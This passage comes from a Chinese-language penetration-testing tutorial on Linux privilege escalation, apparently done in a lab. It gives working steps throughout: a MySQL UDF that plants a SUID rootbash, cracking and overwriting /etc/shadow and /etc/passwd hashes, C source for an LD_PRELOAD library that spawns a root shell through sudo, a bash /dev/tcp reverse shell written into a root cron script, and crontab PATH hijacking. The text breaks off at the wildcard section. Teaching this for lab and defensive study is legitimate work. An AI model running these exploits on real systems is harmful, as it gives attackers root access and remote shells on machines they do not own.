<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125214631297.png?lastModify=1766751620" alt="image-20251125214631297"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125214703047.png?lastModify=1766751620" alt="image-20251125214703047"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125215553588.png?lastModify=1766751620" alt="image-20251125215553588"><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125215713815.png?lastModify=1766751620" alt="image-20251125215713815">	<strong>此时，我们的自定义函数就创建完成了</strong></p>
<p><strong>可以跟着后面走</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4792" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">mysql> select do_system(<span class="cm-string">'id > /tmp/out; chown raptor.raptor /tmp/out'</span>);</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">mysql> \! <span class="cm-builtin">sh</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><strong>也可以自己写，因为此时的这个自定义函数可以执行root命令</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4794" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">mysql> select do_system(<span class="cm-string">'cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash'</span>)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment">#将/bin/bash复制到新建的tmp目录下的rootbash里，给他xs权限，执行它就是在执行bash命令</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" class="cm-tab-wrap-hack">/tmp /rootbash <span class="cm-attribute">-p</span> <span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-comment">#-p<span class="cm-tab" role="presentation" cm-text="	"> </span>强制 bash 以 真实 UID=0 的身份启动，不降级 ，也不加载普通用户的 env 文件；常配合 SUID/被夺 root-shell 用，防止掉权。</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><strong>提权成功</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125220355662.png?lastModify=1766751620" alt="image-20251125220355662"></p>
<p><strong>实质：MySQL可以执行系统命令，在MySQL中修改，再以root方式执行，完成提权</strong></p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><h3 id="思维导图-1"><a href="#思维导图-1" class="headerlink" title="思维导图"></a>思维导图</h3><h1 id="Linux提权精讲：演示2-重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！"><a href="#Linux提权精讲：演示2-重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！" class="headerlink" title="Linux提权精讲：演示2 - 重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！"></a>Linux提权精讲：演示2 - 重磅大作！Linux提权大赏，20种Linux渗透测试提权演示精讲一次看完，渗透测试必修课一次彻底搞定！</h1><h2 id="shadow和passwd-3讲"><a href="#shadow和passwd-3讲" class="headerlink" title="shadow和passwd  3讲"></a>shadow和passwd  3讲</h2><h3 id="1-可读shadow文件利用提权"><a href="#1-可读shadow文件利用提权" class="headerlink" title="1,可读shadow文件利用提权"></a>1,可读shadow文件利用提权</h3><p><strong>原理：用户的错误配置，导致shadow可读</strong></p>
<p><strong>枚举</strong><code>shadow</code>文件</p>
<p><strong>为什么会想到看</strong><code>shadow</code>文件？</p>
<p><strong>跟</strong><code>cat /etc/password</code>同等地位</p>
<p><strong>历史记录，用户可以操作shadow文件</strong></p>
<p><strong>等蛛丝马迹</strong></p>
<p><code>ls -liah /etc/shadow</code>看shadow文件是否全局可读，如果可读，可以尝试hash碰撞</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126192544697.png?lastModify=1766751620" alt="image-20251126192544697"><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126192805737.png?lastModify=1766751620" alt="image-20251126192805737"></p>
<p><strong>这里获得两条hash数据，拿到本地kali，vim存入名为hash的文件，用****john</strong>破解</p>
<p><strong>$6$是SHA-512加密的，但hash-identifier可能会误判为SHA-256，</strong> <strong>不过我们后续的john破解，没有指定format，john自己可以正确识别。</strong></p>
<p><strong>常见的加密类型：</strong></p>
<p><strong>$1 是 MD5</strong></p>
<p><strong>$2 A B Y 2 是decript或者是ploufish</strong></p>
<p><strong>$6$ 是 SHA-512</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126193051057.png?lastModify=1766751620" alt="image-20251126193051057"></p>
<p><strong>提权成功</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126193251417.png?lastModify=1766751620" alt="image-20251126193251417"></p>
<h3 id="2，可写shadow文件利用提权"><a href="#2，可写shadow文件利用提权" class="headerlink" title="2，可写shadow文件利用提权"></a>2，可写shadow文件利用提权</h3><p><strong>原理：用户的错误配置，导致shadow可写</strong></p>
<p><strong>因为是利用重要文件的可写属性，在写操作之前先对该文件</strong><code>shadow</code>做<strong>备份</strong></p>
<p><code>cp /etc/shadow /tmp/shadow.bak</code></p>
<p><strong>这种操作不仅仅是因为渗透测试结束后要打扫战场，还原修改后的重要文件；还因为如果遇到不可预期的情况有回退的可能</strong></p>
<p><strong>既然可写，就可以把root密码替换成自己的</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126194440348.png?lastModify=1766751620" alt="image-20251126194440348"></p>
<p>**需要一个工具 **<code>mkpasswd</code>：用来生成Linux用户名和密码hash的</p>
<p><code>-m</code> 指定hash的加密类型</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126195009255.png?lastModify=1766751620" alt="image-20251126195009255"></p>
<p>**全部复制包括 **<code>./</code></p>
<p><code>vim /etc/shadow</code>替换掉原来的密码(第二个<code>:</code>之前)**	**保存退出即可</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126195111483.png?lastModify=1766751620" alt="image-20251126195111483"></p>
<p><strong>此时密码已经被替换成我们自己的密码了</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126195404198.png?lastModify=1766751620" alt="image-20251126195404198"></p>
<h3 id="3，可写passwd文件利用提权"><a href="#3，可写passwd文件利用提权" class="headerlink" title="3，可写passwd文件利用提权"></a>3，可写passwd文件利用提权</h3><p>**查看当前用户 **<code>/etc/passwd</code> 文件的权限</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126195554548.png?lastModify=1766751620" alt="image-20251126195554548"></p>
<p><strong>虽然现在的Linux发行版的密码都不写在passwd里，写在shadow文件里，但只要我们有passwd的写权限，就可以直接更改root密码</strong></p>
<p><strong>因为文件比较重要，还是先做备份</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126195753878.png?lastModify=1766751620" alt="image-20251126195753878"></p>
<p><strong>利用：生成一个我们自己密码的hash，用</strong><code>openssl</code></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4858" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">openssl</span> passwd 想设的密码</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126195933095.png?lastModify=1766751620" alt="image-20251126195933095"></p>
<p><strong>接下来把密码hash替换passwd里的</strong><code>x</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126200112620.png?lastModify=1766751620" alt="image-20251126200112620"></p>
<p><strong>切换root账户即可</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126200155563.png?lastModify=1766751620" alt="image-20251126200155563"></p>
<p><strong>不管是****可写shadow文件利用提权</strong>用到的 <code>mkpasswd</code>；还是<strong>可写passwd文件利用提权</strong>用到的openssl</p>
<p><strong>都是可以生成Linux里面的密码hash值的</strong>，只是习惯而已</p>
<h2 id="sudo环境变量提权"><a href="#sudo环境变量提权" class="headerlink" title="sudo环境变量提权"></a>sudo环境变量提权</h2><p>**获得初始shell，进行枚举提权时，一定会用到 **<code>sudo -l</code>看当前用户能执行哪些系统命令</p>
<h3 id="提权过程-1"><a href="#提权过程-1" class="headerlink" title="提权过程**	**"></a>提权过程**	**</h3><p><code>sudo -l</code>看当前用户能执行哪些系统命令</p>
<p><strong>这里显示有环境变量的一些设置</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126202657802.png?lastModify=1766751620" alt="image-20251126202657802"></p>
<p><code>env_reset</code> **默认清空用户所有环境变量，再从头放白名单，防止 **<strong>PATH&#x2F;LD_PRELOAD</strong> 等污染 root 上下文。</p>
<p><code>env_keep+=LD_PRELOAD</code> <strong>把 LD_PRELOAD 加回白名单</strong> → 允许 <strong>携带自定义共享库</strong> 进入 sudo 后的 root 进程。</p>
<blockquote>
<p><strong>危害</strong></p>
<p>**如果 sudo 规则里 **<strong>同时</strong>出现：</p>
<ol>
<li><code>env_keep+=LD_PRELOAD</code></li>
<li><strong>某条可执行命令</strong>（如 <code>find</code>&#x2F;<code>iftop</code>&#x2F;任意脚本）</li>
</ol>
<p>**就能 **<strong>注入 .so 劫持函数</strong>，无需找参数逃逸，直接拿 root：</p>
</blockquote>
<p><strong>先写</strong><code>shell.c</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126201448446.png?lastModify=1766751620" alt="image-20251126201448446"></p>
<p><strong>SUID共享库也有另一种写法，对比一下</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="c++" cid="n4895" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="c++"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-meta">#include <stdio.h></span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-meta">#include <sys/types.h></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-meta">#include <stdlib.h></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span cm-text="" cm-zwsp=""></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-variable-3">void</span> <span class="cm-def">_init</span>() {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">unsetenv</span>(<span class="cm-string">"LD_PRELOAD"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">setgid</span>(<span class="cm-number">0</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">setuid</span>(<span class="cm-number">0</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">    <span class="cm-variable">system</span>(<span class="cm-string">"/bin/bash"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">}</span></pre></div></div></div></div></div><div></div></div></div></pre>


<table>
<thead>
<tr>
<th><strong>代码</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>#include ...</code></td>
<td><strong>引入标准头，后面要用</strong><code>setuid/setgid/system</code></td>
</tr>
<tr>
<td><code>void _init()</code></td>
<td><strong>共享库构造函数</strong>；当库被<strong>ld.so 装载</strong>时，<strong>立即执行一次</strong>（无需显式调用）。</td>
</tr>
<tr>
<td><code>unsetenv(&quot;LD_PRELOAD&quot;)</code></td>
<td>*<em>把自己从环境变量里抹去，防止</em>***system(“&#x2F;bin&#x2F;bash”)**再次加载自己而无限递归。</td>
</tr>
<tr>
<td><code>setgid(0); setuid(0);</code></td>
<td><strong>把当前进程****有效 UID&#x2F;GID 硬设为 0</strong>（root）。<strong><br><strong>前提：调用者必须是 root 或具有<code>CAP_SETUID</code>；在</strong>sudo 上下文</strong>里满足。</td>
</tr>
<tr>
<td><code>system(&quot;/bin/bash&quot;);</code></td>
<td>**启动交互 bash，**<strong>继承已提升的 root 身份</strong>。</td>
</tr>
</tbody></table>
<p><strong>然后进行****编译</strong>，因为是以共享库的形式实用的，所有我们要按照共享库的编译语法进行编译</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4917" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">gcc</span> <span class="cm-attribute">-fPIC</span> <span class="cm-attribute">-shared</span> <span class="cm-attribute">-o</span> shell.so shell.c <span class="cm-attribute">-nostartfile</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>


<table>
<thead>
<tr>
<th><strong>片段</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>gcc</code></td>
<td><strong>调用 GCC</strong></td>
</tr>
<tr>
<td><code>-fPIC</code></td>
<td><strong>位置无关代码</strong>（Position Independent Code），<strong>.so 必加</strong>，否则重定位失败。</td>
</tr>
<tr>
<td><code>-shared</code></td>
<td><strong>生成共享库</strong>（.so），不是可执行程序。</td>
</tr>
<tr>
<td><code>-o shell.so</code></td>
<td><strong>输出文件名。</strong></td>
</tr>
<tr>
<td><code>shell.c</code></td>
<td><strong>源文件（里面只有</strong><code>_init</code>或函数，无<code>main</code>）。</td>
</tr>
<tr>
<td><code>-nostartfiles</code></td>
<td><strong>不把 crt1.o、crti.o 等启动文件链接进来</strong>→ 体积更小，<strong>也避免“找不到_<strong>start” 报错</strong></strong>（因为我们根本没有 main）。</td>
</tr>
</tbody></table>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126202459819.png?lastModify=1766751620" alt="image-20251126202459819"></p>
<p><strong>编译成功</strong></p>
<p><strong>下面这个语句集中提现提权的逻辑，具体操作是在这个共享库中完成的</strong></p>
<p><strong>因为可以</strong><code>sudo find</code>在<code>find</code>之前预加载了这个<code>LD_PRELOAD</code>，而<code>LD_PRELOAD</code>里面有提权逻辑</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4944" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> <span class="cm-def">LD_PRELOAD</span><span class="cm-operator">=</span>/home/user/shell.so <span class="cm-builtin">find</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126203520463.png?lastModify=1766751620" alt="image-20251126203520463"></p>
<h3 id="提权逻辑"><a href="#提权逻辑" class="headerlink" title="提权逻辑"></a>提权逻辑</h3><p>**① **<strong>sudo 创建 euid&#x3D;0 的进程</strong> **② *<em><strong>ld.so 先加载 <code>/home/user/shell.so</code></strong>（root 身份）</em>* **③ <strong><code>.so</code> 里的 <code>_init()</code> 执行</strong>：</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="c" cid="n4949" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="c"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-variable">setuid</span>(<span class="cm-number">0</span>); <span class="cm-variable">setgid</span>(<span class="cm-number">0</span>); <span class="cm-variable">system</span>(<span class="cm-string">"/bin/bash"</span>);</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p>**④ **<strong>新 bash 继承 uid&#x3D;0</strong> → <strong>直接拿到 root shell</strong></p>
<h3 id="什么是共享库"><a href="#什么是共享库" class="headerlink" title="什么是共享库"></a>什么是共享库</h3><details><summary>点击展开/收缩</summary>

</details>

<h2 id="自动任务-3讲"><a href="#自动任务-3讲" class="headerlink" title="自动任务  3讲"></a>自动任务  3讲</h2><ul>
<li><code>crontab</code></li>
<li><code>/etc/cron.hourly/</code>、<code>/etc/cron.daily/</code> … 这些目录里有没有<strong>可写的脚本</strong>；</li>
<li><code>/etc/cron.d/</code> 下有没有<strong>自定义文件</strong>；</li>
<li>**普通用户自己的 **<code>crontab -l</code>；</li>
<li><strong>或者 systemd timer 等新型定时机制。</strong></li>
</ul>
<h3 id="1，自动任务文件权限提权"><a href="#1，自动任务文件权限提权" class="headerlink" title="1，自动任务文件权限提权"></a>1，自动任务文件权限提权</h3><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n4970" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">cat /etc/crontab</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126204336748.png?lastModify=1766751620" alt="image-20251126204336748"></p>
<p><strong>这里有以root权限执行两个sh脚本</strong></p>
<p>**先看一下文件所在位置 **<code>locate overwrite.sh</code> ，并且发现具有该文件的可写权限</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126204734971.png?lastModify=1766751620" alt="image-20251126204734971"></p>
<p>**看一下文件内容：把日期写到 **<code>/tmp/useless</code>目录下</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126204825171.png?lastModify=1766751620" alt="image-20251126204825171"></p>
<p><strong>因为该定时任务是以root身份执行，并且可写，那我们可以构造反弹shell</strong></p>
<p>**kali中设置监听 **<code>nc -lvnp 4444</code>      **			**<img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126205042840.png?lastModify=1766751620" alt="image-20251126205042840"></p>
<p><strong>靶机中直接vi修改定时任务文件的内容</strong>			<img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126205639701.png?lastModify=1766751620" alt="image-20251126205639701"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4980" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">bash</span> <span class="cm-attribute">-i</span> >& /dev/tcp/10.10.10.10/4444 <span class="cm-number">0</span>>&1</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126205204874.png?lastModify=1766751620" alt="image-20251126205204874"></p>
<table>
<thead>
<tr>
<th><strong>片段</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>#!/bin/bash</code></td>
<td><strong>告诉系统用 bash 解释执行</strong></td>
</tr>
<tr>
<td><code>bash -i</code></td>
<td><strong>启动****交互式</strong>（interactive）bash，支持补全、历史等</td>
</tr>
<tr>
<td><code>&gt;&amp; /dev/tcp/10.10.10.10/4444</code></td>
<td><strong>Bash 内置特性：把****标准输出（1）<strong>重定向到</strong>TCP 连接</strong>（攻击机 IP 端口）</td>
</tr>
<tr>
<td><code>0&gt;&amp;1</code></td>
<td><strong>把****标准输入（0）<strong>重定向到</strong>标准输出（1）</strong>，也就是同一个 TCP 连接</td>
</tr>
<tr>
<td><strong>隐含 2&gt;&amp;1</strong></td>
<td><strong>标准错误（2）也会跟随 1，一起进 TCP，实现****输入&#x2F;输出&#x2F;错误</strong>全套转发</td>
</tr>
</tbody></table>
<p><strong>保存完退出，此时等上一段时间，kali就会收到反弹shell</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126205833740.png?lastModify=1766751620" alt="image-20251126205833740"></p>
<h3 id="2，自动任务PATH环境变量提权"><a href="#2，自动任务PATH环境变量提权" class="headerlink" title="2，自动任务PATH环境变量提权"></a>2，自动任务PATH环境变量提权</h3><p><strong>除了我们上面的第一种的可写自动任务提权，这里还可以用到PATH环境变量提权</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126211337353.png?lastModify=1766751620" alt="image-20251126211337353"></p>
<p><strong>看到****红框</strong>内说明crontab有shell的指定 <code>/bin/bash</code>； 也有  PATH路径变量的指定</p>
<p><strong>并且在以</strong><code>:</code>分割的路径集中，<strong>黄线</strong>标识了有<code>/home/user</code>排在最前面，优先于<strong>蓝线</strong><code>overwrite.sh</code>的绝对路径</p>
<p>**而当前用户就是 user **<strong>黄线</strong> 。在路径集中排前的会优先执行，</p>
<p><strong>并且定时任务****绿线</strong><code>overwrite.sh</code>的路径只是文件名，不像他的下面一个自动任务是<code>绝对路径</code></p>
<p><strong>所以我们完全可以在本地自己写一个反弹shell的脚本改名为</strong><code>overwrite.sh</code>，系统执行自动任务时优先以<code>PATH /home/user</code>里的<code>overwrite.sh</code>执行</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5014" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">vim</span> overwrite.sh</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-meta">#!/bin/bash</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span cm-text="" cm-zwsp=""></span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">cp</span> /bin/bash /tmp/rootbash</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">chmod</span> <span class="cm-operator">+</span>xs /tmp/rootbash</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126214222546.png?lastModify=1766751620" alt="image-20251126214222546"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126214343412.png?lastModify=1766751620" alt="image-20251126214343412"></p>
<p><strong>实现前提:</strong><code>crontab</code>中，路径PATH的头部有当前的家目录，这样在执行过程中会先执行排前的 目录 中的文件，而不是去找排在后面的<code>overwrite.sh</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126214704941.png?lastModify=1766751620" alt="image-20251126214704941"></p>
<p>**获得root权限  **</p>
<blockquote>
<p><strong>-p</strong>	<strong>强制 bash 以 真实 UID&#x3D;0 的身份启动，不降级 ，也不加载普通用户的 env 文件；常配合 SUID&#x2F;被夺 root-shell 用，防止掉权。</strong></p>
</blockquote>
<h3 id="3，自动任务通配符-‘-‘-提权"><a href="#3，自动任务通配符-‘-‘-提权" class="headerlink" title="3，自动任务通配符 ‘*‘ 提权"></a>3，自动任务通配符 ‘*‘ 提权</h3><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251126215004842.png?lastModify=1766751620" alt="image-20251126215004842"></p>
<p><strong>overwrite.sh的提权方式两种都完了</strong></p>
<p>**下面的 **<code>/usr/local/bin/compress.sh</code>的提权利用如下</p>
<table>
<thead>
